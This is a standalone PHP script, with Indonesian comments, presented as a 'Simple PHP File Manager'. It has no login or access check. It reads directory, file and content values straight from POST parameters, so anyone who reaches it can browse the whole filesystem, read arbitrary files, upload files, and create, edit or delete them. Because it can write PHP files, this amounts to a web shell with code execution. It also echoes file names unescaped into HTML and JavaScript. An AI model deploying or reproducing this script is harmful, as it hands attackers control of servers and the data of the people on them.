<?php
// Ambil direktori saat ini
$currentDir = isset($_POST['dir']) ? $_POST['dir'] : getcwd();
$currentDir = realpath($currentDir);
if (!$currentDir) $currentDir = getcwd();

// Handle delete file/folder
if (isset($_POST['delete'])) {
    $target = $_POST['delete'];
    if (is_dir($target)) {
        if (rmdir($target)) {
            echo "<p style='color:green;'>Folder berhasil dihapus.</p>";
        } else {
            echo "<p style='color:red;'>Gagal menghapus folder (mungkin tidak kosong).</p>";
        }
    } else if (is_file($target)) {
        if (unlink($target)) {
            echo "<p style='color:green;'>File berhasil dihapus.</p>";
        } else {
            echo "<p style='color:red;'>Gagal menghapus file.</p>";
        }
    }
}

// Handle view file
if (isset($_POST['view'])) {
    $fileToView = $_POST['view'];
    if (is_file($fileToView)) {
        echo "<h3>Isi file: " . htmlspecialchars(basename($fileToView)) . "</h3>";
        echo "<pre style='background:#222;color:#0f0;padding:10px;max-height:400px;overflow:auto;'>";
        echo htmlspecialchars(file_get_contents($fileToView));
        echo "</pre><hr>";
    } else {
        echo "<p style='color:red;'>File tidak ditemukan atau bukan file.</p>";
    }
}

// Handle upload file
if (isset($_FILES['file'])) {
    $uploadFile = basename($_FILES['file']['name']);
    $destination = $currentDir . DIRECTORY_SEPARATOR . $uploadFile;

    if (move_uploaded_file($_FILES['file']['tmp_name'], $destination)) {
        echo "<p style='color:green;'>File berhasil diupload.</p>";
    } else {
        echo "<p style='color:red;'>Upload gagal.</p>";
    }
}

// Handle create file
if (isset($_POST['new_file_name']) && isset($_POST['new_file_content'])) {
    $newFileName = basename($_POST['new_file_name']);
    $newFilePath = $currentDir . DIRECTORY_SEPARATOR . $newFileName;
    $newFileContent = $_POST['new_file_content'];

    if (file_exists($newFilePath)) {
        echo "<p style='color:red;'>File sudah ada.</p>";
    } else {
        if (file_put_contents($newFilePath, $newFileContent) !== false) {
            echo "<p style='color:green;'>File berhasil dibuat: $newFileName</p>";
        } else {
            echo "<p style='color:red;'>Gagal membuat file.</p>";
        }
    }
}

// Handle edit file
if (isset($_POST['edit'])) {
    $fileToEdit = $_POST['edit'];
    if (is_file($fileToEdit)) {
        $content = htmlspecialchars(file_get_contents($fileToEdit));
        echo "<hr><h3>Edit File: " . htmlspecialchars(basename($fileToEdit)) . "</h3>";
        echo "<form method='post'>";
        echo "<input type='hidden' name='dir' value='" . htmlspecialchars($currentDir) . "'>";
        echo "<input type='hidden' name='save_edit' value='" . htmlspecialchars($fileToEdit) . "'>";
        echo "<textarea name='edited_content' style='height:300px;width:100%;'>$content</textarea><br><br>";
        echo "<button type='submit'>💾 Simpan Perubahan</button>";
        echo "</form><hr>";
    } else {
        echo "<p style='color:red;'>File tidak ditemukan untuk diedit.</p>";
    }
}

// Handle save edit
if (isset($_POST['save_edit']) && isset($_POST['edited_content'])) {
    $fileToSave = $_POST['save_edit'];
    $editedContent = $_POST['edited_content'];

    if (is_writable($fileToSave)) {
        if (file_put_contents($fileToSave, $editedContent) !== false) {
            echo "<p style='color:green;'>Perubahan berhasil disimpan ke: " . htmlspecialchars(basename($fileToSave)) . "</p>";
        } else {
            echo "<p style='color:red;'>Gagal menyimpan perubahan.</p>";
        }
    } else {
        echo "<p style='color:red;'>File tidak dapat ditulis (read-only).</p>";
    }
}
?>

<style>
    body { font-family: Arial, sans-serif; background: #f4f4f4; }
    .container { width: 900px; margin: 20px auto; background: #fff; padding: 20px; box-shadow: 0 0 10px #ccc; }
    table { width: 100%; border-collapse: collapse; margin-top: 20px; }
    th, td { padding: 8px 12px; border: 1px solid #ddd; text-align: left; }
    th { background: #333; color: #fff; }
    tr:nth-child(even) { background: #f9f9f9; }
    .actions form { display:inline; margin:0; }
    .actions button { margin-right:5px; }
    textarea { width:100%; height:100px; }
</style>

<div class="container">

<h2>Simple PHP File Manager</h2>

<form method="post" enctype="multipart/form-data">
    <input type="text" name="dir" size="60" value="<?= htmlspecialchars($currentDir) ?>">
    <input type="file" name="file" size="15">
    <input type="submit" value="Upload">
</form>

<h3>Isi Folder: <?= htmlspecialchars($currentDir) ?></h3>

<table>
    <tr>
        <th>Nama</th>
        <th>Tipe</th>
        <th>Terakhir Diubah</th>
        <th>Aksi</th>
    </tr>

<?php
$items = scandir($currentDir);

// Pisahkan folder dan file
$folders = [];
$files = [];

foreach ($items as $item) {
    if ($item === '.') continue;

    $fullPath = $currentDir . DIRECTORY_SEPARATOR . $item;

    if (is_dir($fullPath)) {
        $folders[] = $item;
    } else {
        $files[] = $item;
    }
}

$sortedItems = array_merge($folders, $files);

foreach ($sortedItems as $item) {
    $fullPath = $currentDir . DIRECTORY_SEPARATOR . $item;
    $isDir = is_dir($fullPath);
    $lastModified = file_exists($fullPath) ? date("Y-m-d H:i:s", filemtime($fullPath)) : '-';

    echo "<tr>";

    // Kolom Nama
    echo "<td>";
    if ($item === '..') {
        $parent = dirname($currentDir);
        echo "<b><a href='#' onclick=\"document.getElementsByName('dir')[0].value='$parent';document.forms[0].submit();\">⬆️ Kembali ke Atas</a></b>";
    } else if ($isDir) {
        echo "📁 <b>$item</b>";
    } else {
        echo "📄 $item";
    }
    echo "</td>";

    // Kolom Tipe
    echo "<td>" . ($isDir ? "Folder" : "File") . "</td>";

    // Kolom Waktu
    echo "<td>$lastModified</td>";

    // Kolom Aksi
    echo "<td class='actions'>";

    if ($isDir && $item !== '..') {
        echo "<form method='post'>
                <input type='hidden' name='dir' value='".htmlspecialchars($fullPath)."'>
                <button type='submit'>Open</button>
              </form>";
    }

    if (!$isDir) {
        echo "<form method='post'>
                <input type='hidden' name='dir' value='".htmlspecialchars($currentDir)."'>
                <input type='hidden' name='view' value='".htmlspecialchars($fullPath)."'>
                <button type='submit'>View</button>
              </form>";

        echo "<form method='post'>
                <input type='hidden' name='dir' value='".htmlspecialchars($currentDir)."'>
                <input type='hidden' name='edit' value='".htmlspecialchars($fullPath)."'>
                <button type='submit'>✏️ Edit</button>
              </form>";
    }

    if ($item !== '..') {
        echo "<form method='post' onsubmit=\"return confirm('Yakin hapus $item?')\">
                <input type='hidden' name='dir' value='".htmlspecialchars($currentDir)."'>
                <input type='hidden' name='delete' value='".htmlspecialchars($fullPath)."'>
                <button type='submit'>🗑️ Delete</button>
              </form>";
    }

    echo "</td></tr>";
}
?>

</table>

<!-- Form Create File -->
<h3>Buat File Baru</h3>
<form method="post">
    <input type="hidden" name="dir" value="<?= htmlspecialchars($currentDir) ?>">
    Nama File: <input type="text" name="new_file_name" required><br><br>
    Isi File:<br>
    <textarea name="new_file_content"></textarea><br><br>
    <button type="submit">Buat File</button>
</form>

</div>
